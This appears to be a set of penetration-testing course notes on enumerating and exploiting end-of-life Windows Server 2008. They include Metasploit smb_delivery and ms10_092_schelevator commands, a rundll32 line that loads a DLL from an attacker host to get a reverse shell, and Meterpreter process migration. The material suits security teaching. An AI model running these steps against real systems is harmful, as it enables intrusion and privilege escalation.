### Windows Server 2008 Enumeration
```powershell
wmic qfe
powershell.exe -ExecutionPolicy Bypass -File Sherlock.ps1
powershell.exe -ExecutionPolicy Bypass -Command "Import-Module .\Sherlock.ps1; Find-AllVulns"
```

### Metasploit (smb_delivery)
```bash
msf6 exploit(windows/smb/smb_delivery) > use exploit/windows/smb/smb_delivery
msf6 exploit(windows/smb/smb_delivery) > set SRVHOST <attacker_ip>
msf6 exploit(windows/smb/smb_delivery) > set LHOST <attacker_ip>
msf6 exploit(windows/smb/smb_delivery) > set LPORT 4444
msf6 exploit(windows/smb/smb_delivery) > set target 0
msf6 exploit(windows/smb/smb_delivery) > exploit
```

### Target (Run from cmd.exe)
```bash
rundll32.exe \\<attacker_ip>\\lEUZam\\test.dll,0
```

### Metasploit (ms10_092_schelevator)
```bash
msf6 exploit(windows/local/ms10_092_schelevator) > use exploit/windows/local/ms10_092_schelevator
msf6 exploit(windows/local/ms10_092_schelevator) > set SESSION 1
msf6 exploit(windows/local/ms10_092_schelevator) > set LHOST <attacker_ip>
msf6 exploit(windows/local/ms10_092_schelevator) > set LPORT 4443
msf6 exploit(windows/local/ms10_092_schelevator) > exploit
```

### Meterpreter Commands
```bash
meterpreter > getpid
meterpreter > ps
meterpreter > migrate <pid>
meterpreter > background
meterpreter > getuid
meterpreter > sysinfo
```


**Key Points:**

- **EOL Status:**
    - Windows Server 2008/2008 R2 reached end-of-life on January 14, 2020.
- **Security Differences:**
    - Older versions lack many security enhancements found in newer Windows Server releases (e.g., Enhanced Windows Defender ATP, Credential Guard, Device Guard, AppLocker, Control Flow Guard).
- **Case Study Importance:**
    - Understanding the client's business context is crucial when dealing with legacy systems.
    - Recommendations should consider the impact on critical applications and potential mitigation strategies (e.g., network segmentation).
- **Enumeration and Exploitation:**
    - Tools like Sherlock and Windows-Exploit-Suggester can identify missing patches and potential vulnerabilities.
    - Manual enumeration of patch levels is also possible.
    - `wmic qfe` is used to query the current patch level.
- **Exploitation Walkthrough:**
    - Example uses the MS10-092 Task Scheduler vulnerability for privilege escalation.
    - Steps include:
        - Obtaining a Meterpreter reverse shell using `smb_delivery`.
        - Migrating to a 64-bit process.
        - Using the `ms10_092_schelevator` module.
        - The example also shows how to use `ps` and `migrate` within metasploit.
- **Key tools and commands:**
    - `wmic qfe`
    - Sherlock.ps1
    - Windows-Exploit-Suggester
    - Metasploit (`smb_delivery`, `ms10_092_schelevator`)
    - Meterpreter commands (`getpid`, `ps`, `migrate`, `getuid`, `sysinfo`)

**In essence:**

- Windows Server 2008/2008 R2 presents unique security challenges due to its EOL status and lack of modern security features.
- Thorough enumeration and careful consideration of the client's environment are essential when assessing these systems.
- Older operating systems often have many available exploits.
